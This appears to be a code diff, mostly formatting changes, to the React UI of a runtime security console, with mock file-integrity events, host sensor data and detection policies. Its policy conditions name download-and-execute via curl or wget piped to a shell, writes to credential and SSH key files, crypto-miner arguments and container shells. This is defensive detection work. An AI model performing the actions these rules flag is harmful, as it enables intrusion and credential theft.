+    id: "f3",
+    path: "/etc/nginx/conf.d/edge.conf",
+    host: "edge-fra-02",
+    change: "modified",
+    by: "ansible-playbook (CHG-2291)",
+    when: "09:40",
+    before: "sha256:9a10…55e0",
+    after: "sha256:12bc…d0aa",
+    inWindow: true,
+    status: "approved",
+  },
+  {
+    id: "f4",
+    path: "/usr/local/bin/backup.sh",
+    host: "db-prod-01",
+    change: "permissions",
+    by: "chmod 4755 (root)",
+    when: "08:12",
+    before: "0755 root:root",
+    after: "4755 root:root",
+    inWindow: false,
+    status: "unreviewed",
+  },
+  {
+    id: "f5",
+    path: "/etc/ssh/sshd_config",
+    host: "api-prod-01",
+    change: "modified",
+    by: "ansible-playbook (CHG-2288)",
+    when: "Yesterday 22:04",
+    before: "sha256:77e1…0b3c",
+    after: "sha256:a4f0…c912",
+    inWindow: true,
+    status: "approved",
+  },
+  {
+    id: "f6",
+    path: "/lib/modules/6.8.0/extra/nf_tap.ko",
+    host: "edge-fra-02",
+    change: "created",
+    by: "ansible-playbook (CHG-2291)",
+    when: "11:15",
+    before: "–",
+    after: "sha256:d1c8…4e77",
+    inWindow: true,
+    status: "unreviewed",
+  },
+  {
+    id: "f7",
+    path: "/root/.ssh/authorized_keys",
+    host: "worker-prod-04",
+    change: "modified",
+    by: "bash (root)",
+    when: "Yesterday 03:18",
+    before: "sha256:3b9d…e004",
+    after: "sha256:6f21…aa80",
+    inWindow: false,
+    status: "incident",
+  },
+  {
+    id: "f8",
+    path: "/etc/cron.d/logrotate",
+    host: "api-prod-05",
+    change: "deleted",
+    by: "apt-get (unattended-upgrades)",
+    when: "Yesterday 06:30",
+    before: "sha256:8810…f2b5",
+    after: "–",
+    inWindow: true,
+    status: "approved",
+  },
 ];
 
 const FIM_STATUS_TONE = { unreviewed: "warning", approved: "success", incident: "danger" } as const;
@@ -588,17 +975,40 @@ function FimPage() {
   const rows = FIM.filter((f) => !outside || !f.inWindow);
   const cur = FIM.find((f) => f.id === active);
   const cols: Column<FimChange>[] = [
-    { id: "path", header: "Path", width: "30%", cell: (f) => <span className="block truncate font-mono text-xs" title={f.path}>{f.path}</span> },
+    {
+      id: "path",
+      header: "Path",
+      width: "30%",
+      cell: (f) => (
+        <span className="block truncate font-mono text-xs" title={f.path}>
+          {f.path}
+        </span>
+      ),
+    },
     { id: "host", header: "Host", cell: (f) => <EntityChip kind="host" value={f.host} hideKind /> },
     { id: "change", header: "Change", cell: (f) => <Badge>{f.change}</Badge> },
     { id: "when", header: "When", mono: true, cell: (f) => f.when },
-    { id: "window", header: "Change window", description: "Whether the change happened inside an approved change ticket's window.", cell: (f) => (f.inWindow ? <StatusBadge tone="success">Inside</StatusBadge> : <StatusBadge tone="danger">Outside</StatusBadge>) },
-    { id: "status", header: "Review", sortValue: (f) => status[f.id] ?? f.status, cell: (f) => <Badge tone={FIM_STATUS_TONE[status[f.id] ?? f.status]}>{status[f.id]}</Badge> },
+    {
+      id: "window",
+      header: "Change window",
+      description: "Whether the change happened inside an approved change ticket's window.",
+      cell: (f) => (f.inWindow ? <StatusBadge tone="success">Inside</StatusBadge> : <StatusBadge tone="danger">Outside</StatusBadge>),
+    },
+    {
+      id: "status",
+      header: "Review",
+      sortValue: (f) => status[f.id] ?? f.status,
+      cell: (f) => <Badge tone={FIM_STATUS_TONE[status[f.id] ?? f.status]}>{status[f.id]}</Badge>,
+    },
   ];
   const unreviewed = Object.values(status).filter((s) => s === "unreviewed").length;
   return (
     <>
-      <PageHeader title="File integrity" description="1,284 watched paths on 46 hosts: system binaries, auth files, SSH, cron and web server config." actions={<Button icon={<FileLock />}>Edit watched paths</Button>} />
+      <PageHeader
+        title="File integrity"
+        description="1,284 watched paths on 46 hosts: system binaries, auth files, SSH, cron and web server config."
+        actions={<Button icon={<FileLock />}>Edit watched paths</Button>}
+      />
       <KpiGrid>
         <KpiCard label="Changes · 24 h" value="31" unit="files" />
         <KpiCard label="Outside change window" value="4" tone="danger" delta={{ label: "/etc/passwd on db-prod-02", intent: "bad" }} />
@@ -610,7 +1020,15 @@ function FimPage() {
       </FilterBar>
       <div className="grid gap-2.5 xl:grid-cols-[minmax(0,2fr)_minmax(0,1fr)]">
         <Panel title="Changes" description={`${rows.length} changes`} flush>
-          <DataTable label="File changes" columns={cols} rows={rows} getRowId={(f) => f.id} onRowClick={(f) => setActive(f.id)} activeRowId={active} minWidth={860} />
+          <DataTable
+            label="File changes"
+            columns={cols}
+            rows={rows}
+            getRowId={(f) => f.id}
+            onRowClick={(f) => setActive(f.id)}
+            activeRowId={active}
+            minWidth={860}
+          />
         </Panel>
         <Panel title="Change detail" description={cur?.path ?? "No change selected"} aria-label="Change detail">
           {cur && (
@@ -625,7 +1043,11 @@ function FimPage() {
                 <dt className="text-fg-muted">After</dt>
                 <dd className="font-mono text-xs">{cur.after}</dd>
               </dl>
-              {!cur.inWindow && <Callout tone="danger" title="No change ticket covers this">Nobody scheduled a change on {cur.host} at {cur.when}.</Callout>}
+              {!cur.inWindow && (
+                <Callout tone="danger" title="No change ticket covers this">
+                  Nobody scheduled a change on {cur.host} at {cur.when}.
+                </Callout>
+              )}
               <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
                 <Button size="sm" variant="primary" disabled={status[cur.id] === "approved"} onClick={() => setStatus((s) => ({ ...s, [cur.id]: "approved" }))}>
                   Approve change
@@ -667,14 +1089,102 @@ interface Policy {
 }
 
 const POLICIES: Policy[] = [
-  { id: "p1", name: "Crypto miner execution", rule: "proc.cryptominer_exec", category: "Process", severity: "critical", mode: "enforce", scope: "All workloads", hits7d: 3, condition: "spawned_process and (proc.args contains \"stratum+tcp\" or proc.args contains \"--donate-level\" or proc.exe startswith \"/tmp/\")", attack: "T1496" },
-  { id: "p2", name: "Shell spawned in container", rule: "container.shell_spawned", category: "Container", severity: "high", mode: "alert", scope: "k8s.ns != debug", hits7d: 14, condition: "spawned_process and container and proc.name in (sh, bash, zsh, ash) and proc.pname not in (entrypoint.sh)", attack: "T1059.004" },
-  { id: "p3", name: "Outbound to unexpected port", rule: "net.outbound_unexpected_port", category: "Network", severity: "high", mode: "alert", scope: "Production", hits7d: 7, condition: "outbound and not fd.sport in (80, 443, 5432, 6379, 9092) and not fd.sip in (rfc1918)", attack: "T1571" },
-  { id: "p4", name: "Write to sensitive file", rule: "fim.sensitive_file_write", category: "File", severity: "high", mode: "alert", scope: "All hosts", hits7d: 5, condition: "open_write and fd.name in (/etc/passwd, /etc/shadow, /etc/sudoers, /root/.ssh/authorized_keys)", attack: "T1098" },
-  { id: "p5", name: "Unsigned kernel module", rule: "kernel.module_load", category: "Kernel", severity: "medium", mode: "alert", scope: "All hosts", hits7d: 1, condition: "evt.type in (init_module, finit_module) and module.signed = false", attack: "T1547.006" },
-  { id: "p6", name: "ptrace attach", rule: "proc.ptrace_attach", category: "Process", severity: "medium", mode: "alert", scope: "All hosts", hits7d: 2, condition: "evt.type = ptrace and evt.arg.request = PTRACE_ATTACH", attack: "T1055.008" },
-  { id: "p7", name: "Download and execute", rule: "proc.curl_pipe_shell", category: "Process", severity: "high", mode: "enforce", scope: "Production", hits7d: 1, condition: "spawned_process and proc.pname in (curl, wget) and proc.name in (sh, bash)", attack: "T1105" },
-  { id: "p8", name: "Privileged container started", rule: "container.privileged", category: "Container", severity: "medium", mode: "off", scope: "k8s.ns != kube-system", hits7d: 0, condition: "container_started and container.privileged = true", attack: "T1611" },
+  {
+    id: "p1",
+    name: "Crypto miner execution",
+    rule: "proc.cryptominer_exec",
+    category: "Process",
+    severity: "critical",
+    mode: "enforce",
+    scope: "All workloads",
+    hits7d: 3,
+    condition: 'spawned_process and (proc.args contains "stratum+tcp" or proc.args contains "--donate-level" or proc.exe startswith "/tmp/")',
+    attack: "T1496",
+  },
+  {
+    id: "p2",
+    name: "Shell spawned in container",
+    rule: "container.shell_spawned",
+    category: "Container",
+    severity: "high",
+    mode: "alert",
+    scope: "k8s.ns != debug",
+    hits7d: 14,
+    condition: "spawned_process and container and proc.name in (sh, bash, zsh, ash) and proc.pname not in (entrypoint.sh)",
+    attack: "T1059.004",
+  },
+  {
+    id: "p3",
+    name: "Outbound to unexpected port",
+    rule: "net.outbound_unexpected_port",
+    category: "Network",
+    severity: "high",
+    mode: "alert",
+    scope: "Production",
+    hits7d: 7,
+    condition: "outbound and not fd.sport in (80, 443, 5432, 6379, 9092) and not fd.sip in (rfc1918)",
+    attack: "T1571",
+  },
+  {
+    id: "p4",
+    name: "Write to sensitive file",
+    rule: "fim.sensitive_file_write",
+    category: "File",
+    severity: "high",
+    mode: "alert",
+    scope: "All hosts",
+    hits7d: 5,
+    condition: "open_write and fd.name in (/etc/passwd, /etc/shadow, /etc/sudoers, /root/.ssh/authorized_keys)",
+    attack: "T1098",
+  },
+  {
+    id: "p5",
+    name: "Unsigned kernel module",
+    rule: "kernel.module_load",
+    category: "Kernel",
+    severity: "medium",
+    mode: "alert",
+    scope: "All hosts",
+    hits7d: 1,
+    condition: "evt.type in (init_module, finit_module) and module.signed = false",
+    attack: "T1547.006",
+  },
+  {
+    id: "p6",
+    name: "ptrace attach",
+    rule: "proc.ptrace_attach",
+    category: "Process",
+    severity: "medium",
+    mode: "alert",
+    scope: "All hosts",
+    hits7d: 2,
+    condition: "evt.type = ptrace and evt.arg.request = PTRACE_ATTACH",
+    attack: "T1055.008",
+  },
+  {
+    id: "p7",
+    name: "Download and execute",
+    rule: "proc.curl_pipe_shell",
+    category: "Process",
+    severity: "high",
+    mode: "enforce",
+    scope: "Production",
+    hits7d: 1,
+    condition: "spawned_process and proc.pname in (curl, wget) and proc.name in (sh, bash)",
+    attack: "T1105",
+  },
+  {
+    id: "p8",
+    name: "Privileged container started",
+    rule: "container.privileged",
+    category: "Container",
+    severity: "medium",
+    mode: "off",
+    scope: "k8s.ns != kube-system",
+    hits7d: 0,
+    condition: "container_started and container.privileged = true",
+    attack: "T1611",
+  },
 ];
 
 function PoliciesPage() {
@@ -708,13 +1218,29 @@ function PoliciesPage() {
   ];
   return (
     <>
-      <PageHeader title="Policies" description="34 policies, 8 shown: the ones that fired or changed this month." actions={<Button variant="primary" icon={<Plus />}>New policy</Button>} />
+      <PageHeader
+        title="Policies"
+        description="34 policies, 8 shown: the ones that fired or changed this month."
+        actions={
+          <Button variant="primary" icon={<Plus />}>
+            New policy
+          </Button>
+        }
+      />
       <Callout tone="info" title="Switch to enforce after a week in alert mode">
         Policies run in alert mode first. When a policy has had no false positives for 7 days, you can enforce it.
       </Callout>
       <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(0,2fr)]">
         <Panel title="Policies" flush>
-          <DataTable label="Runtime policies" columns={cols} rows={POLICIES} getRowId={(p) => p.id} onRowClick={(p) => (setActive(p.id), setSaved(null))} activeRowId={active} minWidth={860} />
+          <DataTable
+            label="Runtime policies"
+            columns={cols}
+            rows={POLICIES}
+            getRowId={(p) => p.id}
+            onRowClick={(p) => (setActive(p.id), setSaved(null))}
+            activeRowId={active}
+            minWidth={860}
+          />
         </Panel>
         <Panel title="Policy" description={cur?.name} aria-label="Policy detail">
           {cur && (
@@ -731,7 +1257,11 @@ function PoliciesPage() {
               />
               <div className="flex flex-col gap-1">
                 <span className="text-xs text-fg-muted">Condition</span>
-                <pre className="overflow-x-auto rounded border border-line bg-subtle p-2 font-mono text-xs whitespace-pre-wrap" tabIndex={0} aria-label="Condition">
+                <pre
+                  className="overflow-x-auto rounded border border-line bg-subtle p-2 font-mono text-xs whitespace-pre-wrap"
+                  tabIndex={0}
+                  aria-label="Condition"
+                >
                   {cur.condition}
                 </pre>
               </div>
@@ -774,14 +1304,102 @@ interface RtHost {
 }
 
 const RT_HOSTS: RtHost[] = [
-  { id: "h1", name: "worker-prod-04", os: "Ubuntu 24.04", kernel: "6.8.0-45", sensor: "0.14.2", status: "healthy", pods: 38, eps: wave(24, { base: 410, amp: 90, seed: 3 }), lastSeen: "now", mode: "Enforce" },
-  { id: "h2", name: "worker-prod-09", os: "Ubuntu 24.04", kernel: "6.8.0-45", sensor: "0.14.2", status: "healthy", pods: 41, eps: wave(24, { base: 460, amp: 120, seed: 4, spike: 300, spikeAt: 18, spikeLen: 2 }), lastSeen: "now", mode: "Enforce" },
-  { id: "h3", name: "api-prod-01", os: "Debian 12", kernel: "6.1.0-25", sensor: "0.14.2", status: "healthy", pods: 22, eps: wave(24, { base: 220, amp: 60, seed: 5 }), lastSeen: "now", mode: "Enforce" },
-  { id: "h4", name: "api-prod-03", os: "Debian 12", kernel: "6.1.0-25", sensor: "0.14.1", status: "outdated", pods: 24, eps: wave(24, { base: 250, amp: 70, seed: 6 }), lastSeen: "now", mode: "Alert only" },
-  { id: "h5", name: "db-prod-01", os: "Rocky Linux 9.4", kernel: "5.14.0-427", sensor: "0.14.2", status: "healthy", pods: 0, eps: wave(24, { base: 90, amp: 20, seed: 7 }), lastSeen: "now", mode: "Alert only" },
-  { id: "h6", name: "db-prod-02", os: "Rocky Linux 9.4", kernel: "5.14.0-427", sensor: "0.14.2", status: "healthy", pods: 0, eps: wave(24, { base: 85, amp: 20, seed: 8 }), lastSeen: "now", mode: "Alert only" },
-  { id: "h7", name: "edge-fra-02", os: "Ubuntu 22.04", kernel: "5.15.0-119", sensor: "0.13.9", status: "outdated", pods: 6, eps: wave(24, { base: 140, amp: 40, seed: 9 }), lastSeen: "now", mode: "Alert only" },
-  { id: "h8", name: "edge-lon-01", os: "Ubuntu 22.04", kernel: "5.15.0-119", sensor: "0.14.2", status: "silent", pods: 6, eps: [...wave(22, { base: 130, amp: 30, seed: 10 }), 0, 0], lastSeen: "2 h ago", mode: "Alert only" },
+  {
+    id: "h1",
+    name: "worker-prod-04",
+    os: "Ubuntu 24.04",
+    kernel: "6.8.0-45",
+    sensor: "0.14.2",
+    status: "healthy",
+    pods: 38,
+    eps: wave(24, { base: 410, amp: 90, seed: 3 }),
+    lastSeen: "now",
+    mode: "Enforce",
+  },
+  {
+    id: "h2",
+    name: "worker-prod-09",
+    os: "Ubuntu 24.04",
+    kernel: "6.8.0-45",
+    sensor: "0.14.2",
+    status: "healthy",
+    pods: 41,
+    eps: wave(24, { base: 460, amp: 120, seed: 4, spike: 300, spikeAt: 18, spikeLen: 2 }),
+    lastSeen: "now",
+    mode: "Enforce",
+  },
+  {
+    id: "h3",
+    name: "api-prod-01",
+    os: "Debian 12",
+    kernel: "6.1.0-25",
+    sensor: "0.14.2",
+    status: "healthy",
+    pods: 22,
+    eps: wave(24, { base: 220, amp: 60, seed: 5 }),
+    lastSeen: "now",
+    mode: "Enforce",
+  },
+  {
+    id: "h4",
+    name: "api-prod-03",
+    os: "Debian 12",
+    kernel: "6.1.0-25",
+    sensor: "0.14.1",
+    status: "outdated",
+    pods: 24,
+    eps: wave(24, { base: 250, amp: 70, seed: 6 }),
+    lastSeen: "now",
+    mode: "Alert only",
+  },
+  {
+    id: "h5",
+    name: "db-prod-01",
+    os: "Rocky Linux 9.4",
+    kernel: "5.14.0-427",
+    sensor: "0.14.2",
+    status: "healthy",
+    pods: 0,
+    eps: wave(24, { base: 90, amp: 20, seed: 7 }),
+    lastSeen: "now",
+    mode: "Alert only",
+  },
+  {
+    id: "h6",
+    name: "db-prod-02",
+    os: "Rocky Linux 9.4",
+    kernel: "5.14.0-427",
+    sensor: "0.14.2",
+    status: "healthy",
+    pods: 0,
+    eps: wave(24, { base: 85, amp: 20, seed: 8 }),
+    lastSeen: "now",
+    mode: "Alert only",
+  },
+  {
+    id: "h7",
+    name: "edge-fra-02",
+    os: "Ubuntu 22.04",
+    kernel: "5.15.0-119",
+    sensor: "0.13.9",
+    status: "outdated",
+    pods: 6,
+    eps: wave(24, { base: 140, amp: 40, seed: 9 }),
+    lastSeen: "now",
+    mode: "Alert only",
+  },
+  {
+    id: "h8",
+    name: "edge-lon-01",
+    os: "Ubuntu 22.04",
+    kernel: "5.15.0-119",
+    sensor: "0.14.2",
+    status: "silent",
+    pods: 6,
+    eps: [...wave(22, { base: 130, amp: 30, seed: 10 }), 0, 0],
+    lastSeen: "2 h ago",
+    mode: "Alert only",
+  },
 ];
 
 const HOST_STATUS_TONE = { healthy: "success", silent: "danger", outdated: "warning" } as const;
@@ -792,9 +1410,25 @@ function HostsPage() {
   const rows = RT_HOSTS.filter((h) => status.length === 0 || status.includes(h.status));
   const cols: Column<RtHost>[] = [
     { id: "name", header: "Host", pinned: "left", cell: (h) => <EntityChip kind="host" value={h.name} hideKind /> },
-    { id: "os", header: "OS / kernel", cell: (h) => <span className="flex flex-col"><span className="text-xs">{h.os}</span><span className="font-mono text-2xs text-fg-muted">{h.kernel}</span></span> },
+    {
+      id: "os",
+      header: "OS / kernel",
+      cell: (h) => (
+        <span className="flex flex-col">
+          <span className="text-xs">{h.os}</span>
+          <span className="font-mono text-2xs text-fg-muted">{h.kernel}</span>
+        </span>
+      ),
+    },
     { id: "sensor", header: "Sensor", mono: true, cell: (h) => (upgraded.includes(h.id) ? "0.14.2" : h.sensor) },
-    { id: "status", header: "Status", sortValue: (h) => h.status, cell: (h) => <StatusBadge tone={HOST_STATUS_TONE[upgraded.includes(h.id) ? "healthy" : h.status]}>{upgraded.includes(h.id) ? "healthy" : h.status}</StatusBadge> },
+    {
+      id: "status",
+      header: "Status",
+      sortValue: (h) => h.status,
+      cell: (h) => (
+        <StatusBadge tone={HOST_STATUS_TONE[upgraded.includes(h.id) ? "healthy" : h.status]}>{upgraded.includes(h.id) ? "healthy" : h.status}</StatusBadge>
+      ),
+    },
     { id: "mode", header: "Mode", cell: (h) => <span className="text-xs">{h.mode}</span> },
     { id: "pods", header: "Pods", align: "right", mono: true, sortValue: (h) => h.pods, cell: (h) => h.pods },
     { id: "eps", header: "Events / s · 24 h", width: "150px", cell: (h) => <Sparkline data={h.eps} label={`Events per second on ${h.name}`} height={24} /> },
@@ -814,7 +1448,11 @@ function HostsPage() {
   ];
   return (
     <>
-      <PageHeader title="Hosts" description="Every host running the eBPF sensor. Kernels 5.8+ are supported; older kernels fall back to kprobes." actions={<Button icon={<Download />}>Install sensor</Button>} />
+      <PageHeader
+        title="Hosts"
+        description="Every host running the eBPF sensor. Kernels 5.8+ are supported; older kernels fall back to kprobes."
+        actions={<Button icon={<Download />}>Install sensor</Button>}
+      />
       <Callout tone="danger" title="edge-lon-01 stopped reporting 2 h ago">
         The sensor process is not sending heartbeats. Network IDS still sees traffic from this host, so it is up.
       </Callout>
@@ -825,7 +1463,12 @@ function HostsPage() {
         <KpiCard label="Silent" value="1" tone="danger" />
       </KpiGrid>
       <FilterBar onClear={status.length ? () => setStatus([]) : undefined}>
-        <FacetFilter label="Status" selected={status} onChange={setStatus} options={(["healthy", "outdated", "silent"] as const).map((s) => ({ value: s, count: RT_HOSTS.filter((h) => h.status === s).length }))} />
+        <FacetFilter
+          label="Status"
+          selected={status}
+          onChange={setStatus}
+          options={(["healthy", "outdated", "silent"] as const).map((s) => ({ value: s, count: RT_HOSTS.filter((h) => h.status === s).length }))}
+        />
       </FilterBar>
       {upgraded.length > 0 && (
         <p role="status" className="text-sm text-success">
